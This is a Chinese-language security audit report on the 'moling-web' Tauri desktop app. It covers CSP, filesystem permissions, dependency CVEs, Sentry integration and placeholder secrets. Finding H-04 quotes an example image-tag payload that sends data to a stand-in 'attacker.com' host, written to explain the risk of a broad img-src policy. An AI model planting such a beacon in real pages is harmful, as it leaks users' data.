## 安全审计报告 — moling-web/src-tauri @ 2026-06-24

### 执行摘要

- **扫描范围**：1 个 Tauri 配置 + 1 个 capability 文件 + 7 个 Rust crate 依赖 + 30 个 npm 依赖 + 后端 Sentry 集成
- **Critical: 0** | **High: 4** | **Moderate: 2** | **Low: 2**
- **自动修复已完成：1**（CSP connect-src 收缩）
- **需人工处理：3**（updater pubkey、capabilities 权限最小化、前端 Sentry 集成）

---

### 一、Tauri 配置安全审计

#### H-01: Updater ED25519 公钥为占位符 [HIGH | CVSS: N/A — 配置缺陷]

- **位置**：`moling-web/src-tauri/tauri.conf.json:74`
- **当前值**：`"pubkey": "REPLACE_WITH_YOUR_ED25519_PUBLIC_KEY"`
- **业务影响**：
  - **正面**：由于占位符不是有效的 ED25519 公钥，任何签名更新包都会被拒绝，**不会安装恶意更新**
  - **负面**：正式更新也无法通过签名验证，更新功能完全不可用
  - 如果误填入真实但非自己控制的公钥 → 攻击者可签名恶意更新 → RCE
- **修复方案**：
  1. 开发阶段：从 `Cargo.toml` 移除 `tauri-plugin-updater` 依赖，或接受更新功能不可用
  2. 发布前：运行 `tauri signer generate -w ~/.moling-updater-key` 生成 ED25519 密钥对
  3. 将公钥写入 `tauri.conf.json`
  4. 私钥 `~/.moling-updater-key` 存入 CI Secret（如 `MOLING_UPDATER_PRIVATE_KEY`）
  5. CI 发布流程中使用 `tauri signer sign` 对更新包签名
- **验证方法**：`grep -r "REPLACE_WITH" tauri.conf.json` 应无输出（发布前）
- **修复 PR**：需人工处理

---

#### H-02: CSP connect-src 端口范围过宽（已修复）[HIGH → RESOLVED]

- **位置**：`moling-web/src-tauri/tauri.conf.json:35`
- **修复前**：`connect-src 'self' http://localhost:* http://127.0.0.1:*`
- **修复后**：`connect-src 'self' http://localhost:3000 http://localhost:8000 http://127.0.0.1:3000 http://127.0.0.1:8000`
- **业务影响**：
  - 修复前：任意 localhost 端口可被前端连接。若有恶意本地进程在非预期端口监听，可能被利用进行数据外泄
  - 修复后：仅允许 dev server (3000) 和 API server (8000)
- **风险**：如果未来添加新服务端口（如 WebSocket 在 9000），需要更新 CSP
- **验证方法**：`grep "connect-src" tauri.conf.json` 确认端口列表

---

#### H-03: CSP style-src 使用 unsafe-inline [HIGH — 已接受风险]

- **位置**：`moling-web/src-tauri/tauri.conf.json:35`
- **当前值**：`style-src 'self' 'unsafe-inline' https://fonts.googleapis.com`
- **业务影响**：
  - Tailwind CSS v4 和 CSS-in-JS 方案在构建时生成内联样式，需要 `unsafe-inline`
  - 在 Tauri WebView 上下文中，无外部脚本执行入口，XSS 风险显著降低
  - Google Fonts 的 stylesheet 通过 `https://fonts.googleapis.com` 加载，字体文件通过 `https://fonts.gstatic.com`
- **风险评级**：在 Tauri 桌面应用上下文中为 **可接受风险**（无外部内容注入向量）
- **建议**：如果未来迁移到构建时提取 CSS（如 Linaria / vanilla-extract），可移除 `unsafe-inline`
- **验证方法**：构建产物中检查 CSS 是否全部内联在 HTML 中

---

#### H-04: CSP img-src 允许所有 HTTPS 图片源 [HIGH — 建议审查]

- **位置**：`moling-web/src-tauri/tauri.conf.json:35`
- **当前值**：`img-src 'self' data: https: blob:`
- **问题**：`https:` 允许加载任意 HTTPS 来源的图片
- **潜在风险**：
  - 信息泄露：恶意内容中的 `<img src="https://attacker.com/steal?data=...">` 可通过图片请求外泄数据
  - 用户追踪：第三方追踪像素
- **业务需求分析**：墨灵作为 AI 写作工具，可能需要加载：
  - 用户头像（来自 CDN）
  - LLM 生成的图片（来自外部 API）
  - 封面图片（来自第三方书库）
- **建议**：
  - 如果图片来源固定（如自有 CDN），替换 `https:` 为具体域名：`img-src 'self' data: blob: https://cdn.moling.com`
  - 如果来源不固定，保持现状但添加文档说明
- **验证方法**：审计所有 `<img>` 和 CSS `background-image` 的来源

---

### 二、Capabilities 权限审计

#### M-01: fs 权限过于宽泛 [MODERATE]

- **位置**：`moling-web/src-tauri/capabilities/default.json:38-41`
- **当前权限**：
  ```json
  "fs:allow-read",
  "fs:allow-write",
  "fs:allow-exists"
  ```
- **fs scope**（tauri.conf.json）：
  ```json
  "$APPDATA/**", "$DOCUMENT/**", "$DESKTOP/**", "$DOWNLOAD/**"
  ```
- **业务影响**：
  - Web 前端可通过 `@tauri-apps/plugin-fs` 的 JS API 读写用户文档/桌面/下载目录
  - 如果前端存在 XSS，攻击者可读取用户敏感文件
  - `$DOCUMENT/**` 包含用户的个人文档
- **建议**：
  1. 审查业务需求：墨灵是否真的需要写入 `$DESKTOP/**` 和 `$DOWNLOAD/**`？
  2. 如果仅需读写应用数据，限制为 `$APPDATA/**`
  3. 如果用户通过文件对话框选择文件，使用 `dialog:allow-open` / `dialog:allow-save` 即可，不需要 `fs:allow-write` 到整个目录
  4. 考虑使用 path-scoped 权限而非目录级通配符
- **修复 PR**：需人工确认业务需求后调整

---

#### M-02: global-shortcut 权限启用但可接受 [LOW]

- **位置**：`moling-web/src-tauri/capabilities/default.json:42-45`
- **权限**：`global-shortcut:allow-register`、`allow-unregister`、`allow-is-registered`
- **分析**：全局快捷键是桌面应用常见需求（如老板键、快速呼出），风险可控
- **建议**：确认快捷键不与系统快捷键冲突

---

### 三、依赖漏洞扫描

#### 3.1 Rust / Cargo 依赖

| 依赖 | 版本 | 已知漏洞 | 状态 |
|------|------|---------|------|
| `tauri` | 2.11.3 | CVE-2026-42184 (is_local_url) | ✅ **不受影响**（修复于 2.10.3） |
| `reqwest` | 0.12.28 (direct) / 0.13.4 (transitive) | 无已知 CVE | ✅ 最新 |
| `rustls` | 0.23.41 | 无已知 CVE | ✅ 最新 |
| `serde` | 1.0.228 | 无已知 CVE | ✅ 最新 |
| `serde_json` | 1.0.150 | 无已知 CVE | ✅ 最新 |
| `tauri-plugin-updater` | 2.x | 无已知 CVE | ✅ |
| `tauri-plugin-fs` | 2.x | 无已知 CVE | ✅ |

**CVE-2026-42184 详情**：
- **描述**：Tauri 2.0–2.11.0 中 `is_local_url()` 在 Windows/Android 上将远程 URL 错误分类为本地可信来源
- **CVSS**：5.7 (MEDIUM)
- **影响**：攻击者可托管页面，使其子域名匹配应用的自定义 scheme，从而调用仅限本地的 IPC 命令
- **moling 状态**：使用 Tauri 2.11.3 > 2.10.3（修复版本），**不受影响**

#### 3.2 后端 Sentry 依赖

| 依赖 | 版本 | 分析 |
|------|------|------|
| `sentry` | 0.36.0 | ✅ 当前最新稳定版 |
| `sentry-tracing` | 0.36.0 | ✅ 与 sentry 版本匹配 |
| `sentry-core` | 0.36.0 | ✅ 自动解析 |
| `sentry-types` | 0.36.0 | ✅ 自动解析 |

#### 3.3 前端 npm 依赖

| 漏洞 | 严重程度 | 包名 | 影响版本 | 修复版本 | 分析 |
|------|---------|------|---------|---------|------|
| GHSA-g7r4-m6w7-qqqr | LOW | esbuild | >=0.27.3, <0.28.1 | 0.28.1+ | 仅影响 Windows 开发服务器，不影响生产构建。esbuild 由 Vite 间接依赖。**风险：仅限于开发环境** |

**pnpm audit 结果**：1 LOW（esbuild 开发服务器文件读取）

---

### 四、Sentry 集成验证

#### 4.1 后端 Sentry（moling-server-rs）✅

| 检查项 | 状态 | 详情 |
|--------|------|------|
| SDK 初始化 | ✅ | `moling-core/src/logging.rs:47` — `sentry::init()` 配置正确 |
| 优雅降级 | ✅ | `SENTRY_DSN` 为空时返回 `None`，不影响应用启动 |
| Tracing 集成 | ✅ | `sentry-tracing` 0.36 已配置 |
| 环境标签 | ✅ | 支持 `SENTRY_ENVIRONMENT`，回退到 `ENVIRONMENT` |
| Release 标签 | ✅ | 格式 `moling@ver` |
| 采样率 | ✅ | 生产环境 20%，开发环境 100% |
| 中间件 | ✅ | `sentry_middleware` 捕获 5xx 错误 + breadcrumb + request_id |
| Guard 生命周期 | ✅ | `SentryGuard` 持有 `ClientInitGuard`，进程生命周期内保持存活 |
| DSN 配置 | ✅ | `config.rs:88` — `sentry_dsn: Option<String>`，通过 `MOLING_SENTRY_DSN` 环境变量设置 |
| `.env` 示例 | ✅ | `moling-server-rs/.env.example:48` — `# MOLING_SENTRY_DSN=`（已注释，安全） |

**后端 Sentry 集成评级：🟢 优秀** — 设计良好，无安全问题。

#### 4.2 前端 Sentry（moling-web）❌

| 检查项 | 状态 |
|--------|------|
| `@sentry/react` 依赖 | ❌ 未安装 |
| Sentry 初始化代码 | ❌ 未找到 |
| Error Boundary | ❌ 未找到 |

**业务影响**：
- Tauri WebView 中的 JS 运行时错误不会被上报
- React 组件渲染错误不会触发 Sentry 告警
- 桌面端崩溃排查完全依赖用户手动反馈

**建议**（非本审计范围，但强烈推荐）：
1. 安装 `@sentry/react`
2. 在 React 根组件添加 `Sentry.ErrorBoundary`
3. 配置 `beforeSend` 过滤掉开发环境的 HMR 错误
4. 使用与后端相同的 `SENTRY_DSN` 和 `SENTRY_ENVIRONMENT`

---

### 五、代码安全问题扫描

#### 5.1 硬编码密钥/凭证

| 位置 | 严重程度 | 内容 | 分析 |
|------|---------|------|------|
| `moling-server-rs/crates/moling-core/src/config.rs:136` | INFO | `"dev-secret-key-change-in-production"` | 默认 JWT 密钥，仅开发使用，文档已标注需在生产更换 |
| `moling-server-rs/crates/moling-core/src/config.rs:151` | INFO | `"sk-placeholder"` | 默认 LLM API Key 占位符，不会通过真实 API 认证 |
| `moling-server-rs/.env:20` | LOW | `SECRET_KEY=dev-secret-key-change-in-production` | `.env` 文件（不应提交到 Git），与 config.rs 默认值相同 |
| `moling-server-rs/.env.example:21` | ✅ 安全 | `MOLING_SECRET_KEY=change-me-to-a-random-secret` | 示例文件使用安全占位符 |
| `docker/.env.example:12` | INFO | `MOLING_REDIS_URL=redis://:moling_redis_password@redis:6379/0` | Docker 示例密码，生产部署时需更换 |

**密钥检测结论**：无生产密钥泄露。开发环境使用安全占位符。

#### 5.2 OWASP Top 10 快速审计

| OWASP 类别 | 检查结果 | 备注 |
|-----------|---------|------|
| A01: 访问控制失效 | ✅ 通过 | 后端有 JWT 认证中间件，Tauri IPC 受 capability 控制 |
| A02: 加密失效 | ✅ 通过 | 使用 rustls (TLS 1.3)，JWT HS256 |
| A03: 注入 | ⚠️ 待深入审计 | 需审计 SQL 查询和 LLM prompt 注入防护（超出本次范围） |
| A04: 不安全设计 | ✅ 通过 | 有 rate limiting 配置 |
| A05: 安全配置错误 | ⚠️ 参见上述 | CSP img-src 过宽，capabilities fs 权限过宽 |
| A06: 脆弱组件 | ✅ 通过 | 所有依赖无已知漏洞 |
| A07: 认证失败 | ✅ 通过 | JWT + refresh token 模式 |
| A08: 数据完整性失败 | ⚠️ 待做 | 缺少 SBOM 生成（建议 CI 中集成 `cargo cyclonedx`） |
| A09: 日志监控失败 | ⚠️ 待改进 | 前端无 Sentry，后端审计日志目录配置存在但未验证内容 |
| A10: SSRF | ✅ 通过 | reqwest 仅访问已知 API（LLM API、updater endpoint） |

---

### 六、SBOM 摘要

- **Rust 直接依赖**：7 个 crate（tauri + 6 plugins + reqwest + serde + serde_json）
- **Rust 传递依赖**：~300+ crates（通过 Cargo.lock 管理）
- **npm 直接依赖**：21 个（dependencies + devDependencies）
- **含漏洞组件**：1（esbuild — 仅开发依赖，LOW）
- **许可证风险**：无 GPL/AGPL 组件
- **完整 SBOM**：需在 CI 中通过 `cargo cyclonedx` 和 `cyclonedx-npm` 生成

---

### 七、修复汇总

#### 已完成的修复

| 项目 | 文件 | 修改内容 | 严重程度 |
|------|------|---------|---------|
| CSP connect-src 收缩 | `tauri.conf.json:35` | `localhost:*` → `localhost:3000, localhost:8000` | HIGH |

#### 需人工处理的修复

| 序号 | 问题 | 建议操作 | 负责人 |
|------|------|---------|--------|
| 1 | Updater pubkey 占位符 | 开发期移除 updater 插件 / 发布前生成 ED25519 密钥对 | team-lead / infra-cicd |
| 2 | fs scope 权限最小化 | 确认业务需求，限制为 `$APPDATA/**` 或 path-scoped | team-lead |
| 3 | 前端 Sentry 集成 | 安装 `@sentry/react` + ErrorBoundary | react-bundle / team-lead |
| 4 | CSP img-src 审查 | 确认外部图片来源，替换 `https:` 为具体域名 | team-lead |
| 5 | SBOM 生成 | CI 中集成 `cargo cyclonedx` + `cyclonedx-npm` | infra-cicd |

#### 误报清单

| 告警 | 标记原因 | 验证方法 |
|------|---------|---------|
| CVE-2026-42184 (tauri) | Tauri 2.11.3 > 2.10.3（修复版本） | `cargo tree -p tauri` 确认版本 |

---

### 八、合规检查

| 标准 | 状态 | 不合规项 |
|------|------|---------|
| SOC2 — 变更管理 | ⚠️ | updater pubkey 未配置（更新通道未建立） |
| SOC2 — 访问控制 | ✅ | Tauri capabilities 有权限声明，JWT 认证 |
| SOC2 — 监控告警 | ⚠️ | 前端无错误监控 |
| GDPR — 数据最小化 | ✅ | 本地数据存储在 $APPDATA，无强制云端上传 |
| SLSA Level 2 | ❌ | 缺少 SBOM 生成 + 构建签名 |

---

### 九、tauri.conf.json 变更详情

```diff
- "connect-src 'self' http://localhost:* http://127.0.0.1:*"
+ "connect-src 'self' http://localhost:3000 http://localhost:8000 http://127.0.0.1:3000 http://127.0.0.1:8000"
```

### 十、Tauri Updater 密钥生成指南（供 infra-cicd 参考）

```bash
# 1. 生成 ED25519 密钥对
tauri signer generate -w ~/.moling-updater-key

# 2. 导出公钥（写入 tauri.conf.json）
# 公钥文件名：~/.moling-updater-key.pub

# 3. CI Secret 配置
# MOLING_UPDATER_PRIVATE_KEY = base64(~/.moling-updater-key)

# 4. CI 发布流程中对更新包签名
tauri signer sign -k ~/.moling-updater-key -f update.zip
```

---

**审计人员**：安巡知 (security-tauri)  
**审计日期**：2026-06-24  
**下次审计**：每次依赖更新后、发布前
